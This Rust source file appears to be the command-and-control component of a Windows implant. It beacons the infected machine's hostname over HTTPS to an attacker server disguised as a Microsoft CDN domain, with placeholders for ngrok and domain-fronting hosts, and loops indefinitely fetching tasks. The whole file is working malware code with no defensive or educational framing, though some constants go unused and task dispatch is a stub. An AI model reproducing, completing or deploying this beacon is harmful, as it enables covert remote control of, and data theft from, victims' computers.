//! c2.rs — HTTP/S beacon loop using WinHTTP
#![allow(dead_code, non_snake_case, non_upper_case_globals)]

use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::winhttp::{
    WinHttpOpen, WinHttpConnect, WinHttpOpenRequest,
    WinHttpSendRequest, WinHttpReceiveResponse, WinHttpReadData,
    WinHttpCloseHandle, WinHttpSetOption, WinHttpQueryHeaders,
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    WINHTTP_FLAG_SECURE,
};
use winapi::um::winbase::GetComputerNameW;
use winapi::shared::minwindef::MAX_PATH;

// Constants not exported by all winapi versions
const WINHTTP_NO_REFERER:             *const u16    = core::ptr::null();
const WINHTTP_DEFAULT_ACCEPT_TYPES:   *mut *mut u16 = core::ptr::null_mut();
const WINHTTP_NO_PROXY_NAME:          *mut u16 = core::ptr::null_mut();
const WINHTTP_NO_PROXY_BYPASS:        *mut u16 = core::ptr::null_mut();
const WINHTTP_QUERY_STATUS_CODE:      DWORD    = 19;
const WINHTTP_QUERY_FLAG_NUMBER:      DWORD    = 0x20000000;
const WINHTTP_OPTION_CONNECT_TIMEOUT: DWORD    = 3;
const WINHTTP_OPTION_SEND_TIMEOUT:    DWORD    = 5;
const WINHTTP_OPTION_RECEIVE_TIMEOUT: DWORD    = 6;

const SLEEP_MS:       u32  = 30_000;
const C2_HOST:        &str = "update.microsoft-cdn.net";
const C2_PORT:        u16  = 443;
const C2_BEACON_PATH: &str = "/telemetry/v2/collect";
const TIMEOUT:        DWORD = 10_000;

// These consts are patched by builder.py at build time:
pub const NGROK_HOST:         &str = "NGROK_HOST_PLACEHOLDER";
pub const FRONT_DOMAIN:       &str = "FRONT_DOMAIN_PLACEHOLDER";
pub const BEACON_INTERVAL_MS: u64  = 15_000;
pub const JITTER_PCT:         u64  = 30;
pub const BEACON_HOUR_START:  u32  = 8;
pub const BEACON_HOUR_END:    u32  = 20;
pub const DEAD_SLEEP_SECS:    u64  = 3600;

#[cfg(feature = "thread_id_value")]
fn get_thread_id() -> u32 {
    unsafe { winapi::um::processthreadsapi::GetCurrentThreadId() }
}

fn to_wide(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

unsafe fn get_hostname() -> String {
    let mut buf = [0u16; 256];
    let mut size: DWORD = 256;
    GetComputerNameW(buf.as_mut_ptr(), &mut size);
    String::from_utf16_lossy(&buf[..size as usize])
}

unsafe fn build_beacon() -> Vec<u8> {
    let host = get_hostname();
    #[cfg(feature = "thread_id_value")]
    let tid = get_thread_id();
    #[cfg(not(feature = "thread_id_value"))]
    let tid: u32 = 0;
    format!("{{\"host\":\"{}\",\"tid\":{}}}", host, tid).into_bytes()
}

unsafe fn winhttp_request(body: &[u8]) -> Option<Vec<u8>> {
    let ua  = to_wide("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    let host = to_wide(NGROK_HOST);
    let path = to_wide(C2_BEACON_PATH);
    let verb = to_wide("POST");
    let http = to_wide("HTTP/1.1");

    let session = WinHttpOpen(
        ua.as_ptr(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0,
    );
    if session.is_null() { return None; }

    WinHttpSetOption(session, WINHTTP_OPTION_CONNECT_TIMEOUT, &TIMEOUT as *const DWORD as LPVOID, 4);

    let conn = WinHttpConnect(session, host.as_ptr(), C2_PORT, 0);
    if conn.is_null() { WinHttpCloseHandle(session); return None; }

    let req = WinHttpOpenRequest(
        conn,
        verb.as_ptr(),
        path.as_ptr(),
        http.as_ptr(),
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE,
    );
    if req.is_null() {
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        return None;
    }

    let ct = to_wide("Content-Type: application/json\r\n");
    let ok = WinHttpSendRequest(
        req,
        ct.as_ptr() as *const u16,
        ct.len() as DWORD,
        body.as_ptr() as LPVOID,
        body.len() as DWORD,
        body.len() as DWORD,
        0,
    );
    if ok == 0 {
        WinHttpCloseHandle(req);
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        return None;
    }

    WinHttpReceiveResponse(req, core::ptr::null_mut());

    let mut status: DWORD = 0;
    let mut status_sz: DWORD = 4;
    WinHttpQueryHeaders(
        req,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        core::ptr::null(),
        &mut status as *mut DWORD as LPVOID,
        &mut status_sz,
        core::ptr::null_mut(),
    );

    let mut response = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        let mut read: DWORD = 0;
        let ok = WinHttpReadData(req, buf.as_mut_ptr() as LPVOID, buf.len() as DWORD, &mut read);
        if ok == 0 || read == 0 { break; }
        response.extend_from_slice(&buf[..read as usize]);
    }

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    Some(response)
}

fn dispatch_task(_task: Vec<u8>) {
    // task dispatch handled by main beacon loop
}

fn post_beacon(body: &[u8]) -> Option<Vec<u8>> {
    unsafe { winhttp_request(body) }
}

/// Primary beacon loop — never returns.
pub unsafe fn run() -> ! {
    loop {
        let beacon = build_beacon();
        if let Some(task) = post_beacon(&beacon) {
            if !task.is_empty() { dispatch_task(task); }
        }
        winapi::um::synchapi::Sleep(SLEEP_MS);
    }
}
